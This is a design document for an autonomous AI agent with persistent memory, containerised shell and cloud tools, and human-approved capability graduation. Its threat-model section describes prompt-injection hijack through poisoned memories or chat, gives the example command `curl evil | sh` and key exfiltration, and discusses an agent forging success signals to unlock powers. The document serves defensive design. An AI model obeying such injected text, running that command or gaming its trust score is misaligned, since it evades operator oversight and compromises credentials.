# Design

This is the canonical design document for kagura-agent. It describes the project's boundaries, architecture, security membrane, and cockpit internals.

## What kagura-agent is — and is not

A common misread is "it's an AI that calls `recall` / `reference` / `explore`".
That captures only the memory-reader role. The agent's defining capability is
the combination of **memory + actor**:

| | Narrow read (commodity) | What kagura-agent actually is |
|---|---|---|
| **Brain** | Generic chat LLM | Claude (via Agent SDK Python, subscription or API key) |
| **Memory** | Stateless or session-only | Kagura Memory Cloud as persistent backbone — accumulates across runs |
| **Hands** | None — just answers | shell exec / filesystem / git / Docker / Cloudflare / cloud APIs (via MCP) |
| **Time horizon** | One conversation | Long-running tasks resumable from memory state |
| **Differentiation** | Anyone with Claude Desktop + memory MCP plugin matches it | Cost-aware planning + failure-mode learning + sub-agent dispatch with memory handoff |

The agent is an **actor** in the topology — it lives entirely outside `memory-cloud`,
which it reaches CLI-first as its persistent backbone (the membrane leases a
short-lived, read-scoped token in; the host keeps the refresh token). It can be run
as a CLI or a long-running daemon.

---

## kagura-agent and kagura-engineer

kagura-agent and [`kagura-engineer`](https://github.com/kagura-ai/kagura-engineer)
are **two independent agents that share the same "memory + actor" thesis — not a
platform and an app running on it.**

- **kagura-agent** — a general, Docker-based, **high-freedom** autonomous actor:
  arbitrary domains, infra/cloud hands, a Slack/Discord cockpit, the security
  membrane, capability graduation. _v0.1–v0.7 skeleton implemented (Python core +
  tests), plus the egress-sealed brain-in-container and a pluggable
  Claude-SDK / kagura-brain (codex/ollama) backend; container/cloud/transport
  edges are protocol seams with their adapters wired for deployment._
- **kagura-engineer** — an independent, **coding-specialized** agent that drives
  a GitHub issue to a reviewed PR (`doctor` / `setup` / `run` / `review`).
  _Shipping today (CLI + tests)._

They are **separate repositories, separate codebases, on purpose** — engineer
does **not** run on agent's framework, and agent is not blocked on engineer.
Coupling them now would mean re-architecting working, tested code onto an
unbuilt abstraction (designing a platform from a single instance) — the
"abstraction tax before the moat" this project deliberately avoids. Revisit a
shared runtime only once a **second** specialized actor makes the real seams
visible.

What they share is kept **thin and proven, via libraries — not a framework**.
The narrowest, most-proven primitive goes first: the `MemoryClient` shape +
trust-tier discipline, shared through the existing
[`kagura-memory-python-sdk`](https://github.com/kagura-ai/kagura-memory-python-sdk).
Beyond that the relationship is informational, two-way:

- **engineer → agent (reference implementation).** Things agent specs as design,
  engineer has already built in the small and can be lifted from:
  - its narrow `MemoryClient` Protocol (append + scoped read, no admin) and the
    `_TRUST_FILTER = {"trust_tier": "trusted"}` recall filter **are** the
    "Memory provenance" membrane control (untrusted externally-ingested memories
    excluded from behaviour-influencing reads);
  - `LocalMemoryClient` (offline SQLite) is the self-host memory backend;
  - launching [`kagura-code-reviewer`](https://github.com/kagura-ai/kagura-code-reviewer)
    and gating on its verdict is a working model of sub-agent dispatch.
- **agent → engineer (the design ceiling).** The membrane, launcher
  (`CredentialBroker`/`Lease`), cockpit, and graduation curve are where engineer
  goes as it widens beyond a single trusted operator.

**Boundary rule:** anything coding-task-specific (issue→PR, the review loop)
lives in engineer; anything a *general* actor needs (membrane, cred leasing,
cockpit, multi-domain hands, capability graduation) is agent's. A shared
primitive (the `MemoryClient` shape, trust-tier discipline, eventually sub-agent
dispatch) should be **extracted into a shared library once it has proven out in
one of them — not copy-pasted, and not turned into a platform either side must
adopt.**

---

## Architecture

```
                    ┌───────────────────────────────────┐
                    │   Claude Agent SDK (Python)        │
                    │   subprocess-wraps Claude Code CLI │
                    │   → subscription auth inherits     │
                    └───────────────────────────────────┘
                                      │
                          orchestrates tool calls
                                      │
        ┌─────────────────────────────┼─────────────────────────────┐
        ▼                ▼            ▼            ▼               ▼
   ┌─────────┐   ┌───────────┐  ┌─────────┐  ┌─────────┐    ┌────────┐
   │ memory- │   │filesystem │  │  shell  │  │cloudflare│    │ custom │
   │ cloud   │   │   MCP     │  │   MCP   │  │   MCP   │    │  MCP   │
   │  MCP    │   │           │  │ (Docker │  │  / aws  │    │ per-   │
   │         │   │           │  │ -isolat)│  │  / gcp  │    │ tenant │
   └─────────┘   └───────────┘  └─────────┘  └─────────┘    └────────┘
        │
   recall / reference / explore  ← read past learnings
   remember / create_edge       ← write what was learned
   ingest_events                ← push cost ledger / task tracker
```

### Auth model

- **Python Agent SDK** wraps the Claude Code CLI as a subprocess →
  the user's Pro/Max subscription is inherited automatically.
- **Self-hosted / single-user mode**: flat subscription cost regardless
  of agent load (within Anthropic's cap-based metering: 5h rolling +
  weekly 7-day rolling). No per-token tracking required.
- **API-key (BYOK) mode**: where subscription inheritance isn't available,
  set `ANTHROPIC_API_KEY` (BYOK) instead.
- `ANTHROPIC_API_KEY` env, if set, overrides subscription auth.

This dual-path (subscription, or a BYOK API key) is the same pattern
memory-cloud already uses for LLM provider keys.

### Brain-provider seam

The seam was drawn so a second brain would be a **pure addition, not a rewrite**:
`core/session.py` never calls the Claude Agent SDK directly — it depends on a
`BrainProvider`, and all provider specifics live behind an engine. **That boundary
has now paid off** — two backends ship behind the same protocol, selected per
deploy by `KAGURA_AGENT_BRAIN` (`sdk`, the default, or `kagura-brain`):

- **`sdk`** — `SdkEngine`, the **Claude Agent SDK** (subscription-inherited Claude
  Code CLI). The default; existing runs are unchanged.
- **`kagura-brain`** — `KaguraBrainEngine`, wrapping the sibling
  [`kagura-brain`](https://github.com/kagura-ai/kagura-brain) one-shot library,
  whose `KAGURA_AGENT_BRAIN_BACKEND` picks **claude** or **codex**, with
  `KAGURA_AGENT_BRAIN_MODEL` to pin a model and `KAGURA_AGENT_BRAIN_LOCAL_PROVIDER`
  for a **local `--oss` ollama/lmstudio** brain (or `KAGURA_AGENT_BRAIN_ENDPOINT`
  + key for a BYO OpenAI-compatible gateway such as Ollama Cloud). Both of its
  backends are **subscription-first**, matching the sdk path: claude inherits the
  Pro/Max login, and codex inherits the **ChatGPT subscription** written by
  `codex login` (`~/.codex/auth.json`) — the adapter strips `OPENAI_*`/`CODEX_*`
  from the child env so an ambient API key or base-URL can never silently switch
  billing or reroute a subscription run. BYO is the explicit opt-out and must be
  fully paired: `KAGURA_AGENT_BRAIN_ENDPOINT` **and** `KAGURA_BRAIN_API_KEY`, both
  or neither (a half-set pair fails closed before the run).

**`KAGURA_AGENT_PERMISSION_MODE`** (sdk backend only) sets the Agent SDK's headless
tool-approval policy: `default` | `acceptEdits` | `plan` | `bypassPermissions` |
`dontAsk` | `auto`. There is **no interactive approval channel in a headless run**,
so `default` dead-ends every mutating tool. The per-path default reflects *who*
drives the run: the **operator-typed `run` / `repl`** default to **`acceptEdits`**
(you ran the command at your own shell — the agent may write/edit files), while the
**`serve`** cockpit brain keeps the safe **`default`** (a chat participant is not
necessarily the operator, and the in-process serve brain is unsandboxed). Set the
variable explicitly to override on any path — e.g. `bypassPermissions` for full
autonomy (shell, git). A typo fails closed (exit 2). _Inside a `serve --container`
run the membrane, not this mode, bounds reach._

The original v1 design rule — _ship one brain, but never be Claude-shaped_ — is
what kept that codex/ollama backend a drop-in. It is restated below unchanged.

**The rule:** `core/session.py` never calls the Claude Agent SDK directly. It
depends on a `BrainProvider`. All Claude specifics live behind `ClaudeBrain`,
and `auth.py` becomes **per-provider** auth resolution rather than a
Claude-global resolver.

**Where the seam sits (decided): _above_ the agentic loop.** Both the Claude
Agent SDK and Codex CLI self-drive their own tool-calling loop, so the provider
**owns its loop**; `session.py` orchestrates _tasks and checkpoints_, never
individual tool calls. Drawing the seam below the loop (session.py driving each
tool call) would fit Claude but lock Codex out — the opposite of the goal.
`BrainEvent` normalization is the spot most likely to leak; don't over-design it
on paper — validate it against one real `recall → tool-call → result → continue`
MCP flow at first code.

```python
class BrainProvider(Protocol):
    name: str
    def resolve_auth(self) -> AuthContext: ...        # subscription-inherit | BYOK | API key
    def capabilities(self) -> BrainCaps: ...          # mcp, subagents, resume, …
    async def run(self, turn: Turn) -> AsyncIterator[BrainEvent]: ...

# Turn  = provider-agnostic inputs (task, mcp configs, tool results, budget)
# BrainEvent = normalized stream (text | tool-call | cost | done)
```

What crosses the seam vs what stays hidden behind an implementation:

| Agnostic (defined by kagura) | Provider-specific (behind the impl) |
|---|---|
| task / prompt, MCP server configs, tool results | subprocess invocation, CLI flags |
| normalized event stream (text, tool-call, cost, done) | the underlying CLI's event / parse format |
| checkpoint & session-state shape | how auth is inherited (subscription vs key) |
| budget signal | model id, context-window quirks |

**Hard constraint — memory must be reachable.** memory-cloud is the backbone,
reached **CLI-first** (`kagura auth login` on the host; the membrane leases a
short-lived, read-scoped access token into the container — the refresh token
never crosses). The _startup gate_ is therefore "memory is reachable +
authenticated via the CLI", **not** "the brain speaks MCP": a run where memory
is unreachable is rejected, never degraded. This gate is brain-independent
(`mcp/memory_cloud.py`), so memory does not couple to any one brain. MCP itself
is orthogonal and optional — Claude Code's `--mcp-config` carries *other* MCP
servers; memory does not depend on it.

**Auth is per-provider.** Claude inherits the subscription via the CLI
subprocess; a future Codex/OpenAI brain may only have API-key / BYOK. `auth.py`
resolves *per provider* and does not assume subscription exists. The
`ANTHROPIC_API_KEY` override stays a Claude-specific detail behind `ClaudeBrain`.

**Scope discipline (held).** The original cut shipped `ClaudeBrain` only — one
protocol, no speculative abstraction beyond it. The second backend (`kagura-brain`,
reaching codex + local/cloud ollama) was then added **behind that same, unchanged
protocol**, selected by one env var — exactly the "pure addition, not a rewrite"
the seam was insurance for. The protocol is still the whole abstraction; nothing
was generalized on paper ahead of the second real consumer.

---

## Differentiating capabilities

The four capabilities below are what make memory + actor worth more than
their sum. None of them are achievable with a stateless agent or a
memory-less actor.

### 1. Cost-aware planning

Before kicking off a multi-step task, the agent recalls past similar
tasks' actual cost (token spend, time, retries, failure modes) and
adjusts plan + budget accordingly. Example:

```
user: "deploy v0.16.1 to staging"

agent:
  → recall("deploy staging", filters={status: "failed"})
  → finds 2 past failures (Caddyfile permission trap, env-file omission)
  → adds explicit pre-flight checks for both before deploy
  → reserves 30% buffer over avg historical cost
```

### 2. Long-running task resume

Context window dies; the agent doesn't. Task state is checkpointed to
memory-cloud and resumed cleanly in a fresh session:

```
session 1 (interrupted):
  remember(type="task-checkpoint", details={
    step: 4, pending: ["test", "deploy"],
    granted_budget: {scope: ..., expires_at: ..., renewals_left: 2}  # NOT the live credential
  })

session 2 (resumed):
  recall("task-checkpoint", filters={task_id: ...}, k=1)
  → "continuing from step 4 of N — pending: [test, deploy]"
  → launcher re-acquire()s a fresh short-lived lease under the remaining budget
```

The checkpoint stores the **granted budget, never the live credential** (which
was `release()`d at checkpoint) — see the launcher's `CredentialBroker` / `Lease`
under "Security membrane". This is what lets a task be both long-running and
credential-short-lived at the same time.

### 3. Failure-mode learning

Every failure becomes a memory with a `prevents` edge to its fix:

```
remember(
  summary="Caddyfile cp fails when root-owned",
  type="bug-fix",
  details={trigger: "...", fix: "sudo chown ... && retry"}
)
create_edge(from=fix_memory, to=task_memory, type="prevents")
```

Next time the agent plans a similar task, the recall surfaces this fix
preemptively. Failure cost → 0 over time on recurring patterns.

### 4. Sub-agent dispatch with memory handoff

A large task spawns child agents; context is passed not as prompt
text but as memory IDs:

```
parent agent:
  remember(summary="task context for child", scope="working", ttl=3600)
  → returns memory_id

  dispatch(child_agent, prompt="recall memory_id=<...> and execute")

child agent:
  recall(memory_id=<...>)
  → child works on it, writes its own memories, finishes
  → parent recalls child's output memories to continue
```

Parent context window stays small; complex pipelines become composable.

---

## Phase 1 capability scope

Tightly scoped to validate the "memory + actor" thesis before broadening:

| Capability | In | Out |
|---|---|---|
| shell exec (Docker-isolated) | ✅ | host shell ❌ |
| filesystem read/write (project root) | ✅ | system-wide fs ❌ |
| git ops (clone, commit, push) | ✅ | rebase / force-push ❌ |
| `.env` and config file mgmt | ✅ | OS pkg install ❌ |
| Cloudflare DNS read | ✅ | DNS write (Phase 2) |
| `sudo apt install` etc. | ❌ Phase 2 | (surprisingly dangerous) |
| memory-cloud full MCP toolset | ✅ | — |

The "surprisingly dangerous" note on `sudo apt install` reflects a real
concern: package installation has the widest blast radius of any common
ops action. It gets gated behind explicit Phase 2 review.

> **Read this table as the _initial_ state of the graduation curve, not a fixed
> wall.** The In/Out split is where each capability *starts*; the **Security
> membrane** below governs how the "Out" / Phase-2 entries move (via HITL-gated
> capability graduation, per-category, fail-closed). Inside the container the
> agent already has full freedom — so an "Out" entry like DNS-write or
> `apt install` means "not granted to a run by default yet," not "the binary is
> absent." The membrane, not this table, is the source of truth for what a given
> run is actually allowed to reach.

---

## Security membrane (self-host v1)

**Core principle: the boundary worth defending is _what the container can
reach_, not _what runs inside it_.** Inside the container the agent has full
freedom (apt, arbitrary CLIs, Linux base) on a self-responsibility basis. That
freedom is only safe because the membrane controls what crosses in and out.

### Threat model: agent hijack, not user carelessness

The real risk is not "the user broke their own files." It is **agent hijack via
prompt injection**. The LLM reads untrusted content on every run — memory-cloud
recall results, Slack/Discord messages, web pages, file contents — any of which
can carry injected instructions. An agent with unrestricted apt + shell +
network is a _confused deputy_: a single poisoned memory or message can make it
run `curl evil | sh`, and standing credentials turn that into total cloud
compromise.

> "Self-responsibility" explicitly **includes the hijack risk**, not just "I
> deleted my own file." Scope covers "got hijacked and my keys were
> exfiltrated."

This model holds for **self-host single-user only**. Docker here is a
_convenience boundary, not a security boundary_. A shared/multi-tenant deployment
would need gVisor / Firecracker / microVM-class isolation — the self-responsibility
premise must not be carried into a shared environment.

**This must be a code gate, not a doc promise.** In a shared/multi-tenant mode,
selecting the Docker-only isolation profile is a **hard startup error**
(fail-closed): the run refuses to launch without a microVM-class profile. A
self-host-tuned default must not be able to leak into a shared environment via one
config flag.

### The membrane: what crosses, what does not

| Control point | Rule | Why |
|---|---|---|
| **Credentials** | No ambient env keys. Inject **per-task, scoped, short-lived** creds at launch. | A resident AWS/GCP/Cloudflare key + hijack = instant cloud-wide loss. |
| **`docker.sock`** | **Never mounted into an agent container.** | Mounting it = host root. Only the cockpit (trusted host process) speaks to Docker. |
| **Filesystem** | Mount **project root only**. No home / host FS. | Limits what a hijacked run can read or corrupt. |
| **Egress** | **Enforcing**, not just logged: a single egress proxy is the only route out (default-deny + allowlist + log). | A self-host operator has no on-call — egress must *block* during the window before a human reads the alert, not merely record. See `docs/operations.md`. |
| **Memory provenance** | Recall results carry a `source` / trust-tier. Externally-ingested memories (e.g. chat pulled in by an external connector) are **untrusted input**. | memory-cloud is read every run and ingests attacker-reachable chat — it is a cross-system injection channel (separate bot ids do not help; the *data* is shared). |
| **User namespace** | userns-remap / rootless Docker. | Container root ≠ host root. |

### Image composition: bake tools, inject secrets

Tools (binaries) and credentials are split by an absolute line. **Tools may be
baked; credentials and first-party code must be injected.** A baked binary is
harmless — only the standing key it would use is dangerous.

| | Baked into image | Injected at run |
|---|---|---|
| **Essential (L1)** | bash/coreutils, `git`, `curl`, `jq`, `ripgrep`, `openssh-client`, Python runtime (Agent SDK), `gh` | — |
| **MCP config** | connection URLs only | MCP tokens |
| **Language toolchains (L2)** | per-variant: `python`, `node`, `rust`… (version-pinned) | — |
| **Cloud CLIs** | only the cloud(s) actually used, as an L2 variant — `gh` in L1; `awscli`/`gcloud` per use; **Azure not baked** | scoped cloud creds |
| **Secrets** | **never** | all of them |
| **First-party code** (memory-cloud, sibling repos) | **never** (goes stale, couples versions) | mounted / pulled |

Images form a **`FROM` inheritance chain, not a 3-way choice**: L1 `base` is
built once; L2 variants (`python`, `aws`, …) inherit from it. **L3 is not an
image** — it is `apt install` inside a live container, the escape hatch for
the rare tool no variant carries. Cloud and language CLIs are heavy
(`gcloud` SDK is GB-class), version-drift-prone, and the widest supply-chain
surface — so they are bake-only-what-you-use, never bake-everything.

> v1 starts with **`base` + `python`** variants only. Add a language/cloud
> variant the day a task needs it; lean on L3 (apt) until then. Don't
> pre-build images you won't run.

**Distribute Dockerfiles, not prebuilt images.** The operator builds locally
from recipes (pulling upstream packages directly). This (a) sidesteps the
redistribution terms that bundling `awscli` v2 / `gcloud` into a shipped image
would trigger — see `docs/legal.md` — and (b) matches the self-host model. Pin
for reproducibility: **base image by digest, apt/pip via lockfiles**; defer
rebuild automation and any private registry to post-launch.

### The launcher: per-run capability binding

A baked image carries _capability inventory_; the **launcher** decides, per
task, _what of that inventory this run actually gets_:

```
launcher(task) →
  ├─ image    : pick one L2 variant (or bare base)
  ├─ creds    : scoped, short-lived, per-task injection
  ├─ mount    : project root only
  └─ egress   : per-task allowlist
  → docker run  (a zero-credential image, granted only this run's powers)
```

This `{image, creds, mount, egress}` 4-tuple **is** the capability-graduation
gate (below). The launcher is the only thing that calls `docker run`.

**Credentials are leased, not handed over.** The `creds` slot is a
`CredentialBroker` that issues a `Lease`, not a raw key:

```python
class CredentialBroker(Protocol):
    def acquire(self, scope: Scope) -> Lease: ...

class Lease(Protocol):
    def renew(self) -> None: ...     # STS: re-AssumeRole  | Cloudflare: re-mint token
    def release(self) -> None: ...   # STS: no-op          | Cloudflare: revoke token
```

This one abstraction absorbs both credential shapes (stateless STS-style vs
Cloudflare's stateful mint→use→revoke; see `docs/operations.md`) **and** resolves
the long-running-task vs short-lived-cred tension:

- **HITL approval grants a _budget_, not a credential** — "this task may hold
  `scope` for up to N hours, auto-renewing, ≤ M renewals." The broker mints
  short-lived leases (15 min–1 h each) and **renews them transparently** within
  the budget without re-prompting the human; budget exhaustion **fails closed**
  and re-prompts.
- **Checkpoint/resume composes cleanly**: a checkpoint stores the _granted
  budget_, never the live credential (which is `release()`d at checkpoint). A
  resumed run re-`acquire()`s under the remaining budget. So creds stay
  short-lived while multi-hour and resumable tasks still work.

Leases are tracked in a durable ledger so orphans can be swept on crash — see
`docs/operations.md` (credential lifecycle).

### Cockpit: a trusted host-direct process

The cockpit (Slack/Discord control surface, separate bot id `@kagura-agent`)
runs as a **long-lived process directly on the host — inside the trust
boundary**. It holds the bot token and is the only component besides the
launcher that touches Docker. **Agent containers are untrusted; the cockpit is
trusted. These never mix** — `docker.sock` reaches the cockpit, never an agent.

```
Slack/Discord DM ─event─▶ Cockpit (host, trusted)
                            │ 1. transport abstraction  (Slack/Discord/CLI → one Event)
                            │ 2. session registry        (thread ⇄ running container)
                            │ 3. intent router           (launch / continue / status / approve / kill)
                            │ 4. HITL approval           (cred/egress escalation via DM buttons)
                            ▼
                 launcher(task) ─▶ docker run (zero-cred image + scoped powers)
                            ▼
                  agent container (brain = Claude Code CLI) ─stdout/event─▶ back to thread
```

- **thread = session.** A top-level DM starts a new task (new container); a
  reply in that thread is a message to the running agent. Concurrency is
  expressed by the UI itself.
- **Transport is abstracted** (the UI-side mirror of the brain-swap seam):
  Slack (Bolt, Socket Mode — no public URL, fits self-host), Discord
  (discord.py), and a CLI adapter all normalize to one `Event`; the core is
  transport-agnostic.
- **HITL approval is the cockpit's reason to exist.** When the launcher needs
  powers beyond baseline, the cockpit asks the human in-DM (✅/❌ buttons). The
  approval log (who / when / what) accumulates into the trust score below.

### Capability graduation

The Phase 1 In/Out table is a **graduation curve, not a fixed list**. Dangerous
operations (DNS write, `apt install`, new cloud creds) start locked. As
success-memories accumulate in a category with zero failures, the agent
proposes unlocking it; the accumulated `create_edge(type="prevents")` history
**is** the trust score. Under full-freedom-inside-the-container, what graduates
is never "can it execute" but **"what image / creds / egress / mounts this run
is granted"** — i.e. the launcher's 4-tuple, gated by cockpit HITL.

**Thresholds.** These gate **when to _propose_ a graduation, not when to grant
one** — the human HITL approval is the real gate. That reframing is why the
numbers are moderate rather than paranoid: a too-high bar just means a
low-volume self-host user never sees a proposal at all. Defaults (config knobs,
tune against real run data):

| Knob | Default | Rationale |
|---|---|---|
| `min_successes` | **5** | Enough signal to surface a proposal; with a human as final gate, 10+ only adds friction for a single-user, low-volume host. |
| `min_distinct_tasks` | **3** | Anti-gaming: one repeated cron-like task must not farm trust into an unlock. |
| `failure_window` | **since last reset** | "Zero failures" is measured since the category was last locked/demoted, not over an arbitrary window. |
| `cooldown` | **7 days** | Forces evidence to accrue over time, not in one burst of same-day runs. |

A proposal fires only when **all** hold. The unlock itself is always a **HITL
proposal, never automatic**. **Fail-closed:** a single failure in a graduated
category demotes it (back to ask-every-time) and resets the counter. Trust is
**per-category** — graduating DNS-write grants nothing toward `apt install`. The
trust signal is the accumulated `prevents`-edge + success-memory count,
discounted by recency-weighted failures.

Two integrity rules keep graduation from becoming a hijack amplifier:

- **Input-trust gating.** A graduated capability is **not auto-applied to a run
  whose input includes untrusted (externally-ingested) memories** — such a run
  falls back to ask-every-time. Otherwise a poisoned memory inherits the
  standing trust the agent earned earlier.
- **Independent success signal.** "Success/failure" feeding the trust score must
  come from a signal the agent cannot forge (exit code, test result, human
  approval log) — **never the agent's own self-report**. A hijacked agent must
  not be able to manufacture its own graduation.

### Container hardening

Docker is a _convenience boundary_, so it is hardened as defense-in-depth while
accepting it is not airtight:

- userns-remap / rootless; run as a **non-root user** inside the container
- `--cap-drop=ALL`, add back only the capabilities the task needs
- `--security-opt no-new-privileges`; keep the **default seccomp profile**
  (never `--privileged`, never `--security-opt seccomp=unconfined`)
- **read-only rootfs** + tmpfs scratch; the project-root bind is the only
  writable mount
- no host network / PID / IPC namespaces; bridge networking behind the egress
  allowlist
- `--pids-limit`, memory/CPU caps (also contains runaway loops / DoS)
- **never** `docker.sock`, **never** host FS beyond project root

> Honest limit: a kernel 0-day defeats all of the above. For self-host
> single-user the residual risk is **accepted**; a shared/multi-tenant lane demands
> gVisor / Firecracker / microVM-class isolation. Restated here so the
> self-responsibility premise never silently crosses into a shared environment.

---

## Control surface internals (cockpit)

The membrane spec fixes _what_ the cockpit is (trusted host process, sole Docker
caller). This section fixes _how_ it is built. v1 keeps every part deliberately
dumb.

### Intent router — structural before semantic

Classify each incoming `Event` into an intent **structurally** before reaching
for any NLU:

| Intent | How it's recognized (v1) | Action |
|---|---|---|
| **launch** | a top-level DM (not in a thread) | `launcher(task)` → new container → open a thread |
| **continue** | a reply inside an existing session thread | forward the message to that container's brain |
| **status** | slash/keyword (`/status`) | render the session registry |
| **approve** | an interactive button payload | resolve a pending HITL request |
| **kill** | slash/keyword (`/kill`) or the ❌ button | SIGTERM the container, free the session |

`launch` vs `continue` is **thread position, not language** — no model call
needed. Only genuinely ambiguous free-text falls back to the brain to classify.

> **Injection-safety:** the fallback classifier runs untrusted DM text through
> an LLM **inside the trusted host process**. It must be a **tool-less,
> credential-less, egress-less** sandboxed brain (pure classification) — never
> the same context that holds the cockpit's root credential. Otherwise the
> cockpit itself becomes a prompt-injection surface.

### Session registry

```
thread_id → Session{
  container_id, image, granted_caps,
  status: launching|running|awaiting_approval|done|killed,
  task, created_at
}
```

v1 is an in-memory dict **checkpointed to memory-cloud**, so a cockpit restart
recovers live sessions. On restart, **reconcile** the registry against
`docker ps` (adopt survivors, mark vanished ones `done/killed`).

### HITL approval flow

```
agent run needs powers > baseline
   └─▶ launcher emits CapabilityRequest{caps, reason, task}
        └─▶ cockpit posts an interactive message (✅/❌) to the thread
             └─▶ human decides  ──▶ launcher injects (or denies) the scoped cred/egress
                  └─▶ decision logged to memory-cloud  (feeds the trust score)
```

Default **deny on timeout**. Every decision (who / when / what / outcome) is a
memory — this log _is_ the graduation evidence base.

### Transport adapter interface

```python
class Transport(Protocol):
    async def listen(self) -> AsyncIterator[Event]: ...
    async def send(self, thread_id: str, reply: Reply) -> None: ...
    async def ask(self, thread_id: str, prompt: str, options: list[str]) -> str: ...  # HITL
```

Slack (Bolt, **Socket Mode** — no public URL), Discord (discord.py), and a CLI
adapter all normalize to one `Event`. **The core never imports a transport
SDK** — same discipline as the brain-provider seam, applied to the UI edge.

### Output streaming

Agent stdout/events are **batched, not per-token**: post tool-calls as they
happen, stream final text in readable chunks. Avoids flooding a DM thread with
token spam while keeping the run observable.

### What shipped

The vertical slice landed first on the **CLI adapter** — task in → launcher →
zero-cred container → reply — then **Slack (Bolt, Socket Mode) and Discord
normalizers were added as pure additions** behind the same `Transport` protocol,
no core change, driven by `kagura-agent serve --transport slack|discord` (with an
operator-identity gate on HITL approvals so only the configured operator can
`/approve`). Intents `launch / continue / status / approve / kill` and the
cred/egress HITL type are all wired; a richer status dashboard is still future.

> On the CLI the same intents map without thread structure: `launch` = a new
> `kagura-agent run` invocation, `continue` = stdin to the live session,
> `approve` = an inline prompt, `kill` = SIGINT. The thread-position rules above
> are the chat-transport binding of these same intents, added later.
